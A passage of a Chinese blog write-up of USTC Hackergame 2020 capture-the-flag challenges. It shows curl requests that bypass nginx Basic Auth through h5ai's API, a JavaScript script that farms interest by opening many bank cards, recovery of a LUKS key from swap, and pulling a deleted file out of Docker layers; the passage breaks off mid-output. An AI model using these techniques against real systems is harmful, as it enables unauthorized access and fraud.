<code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span 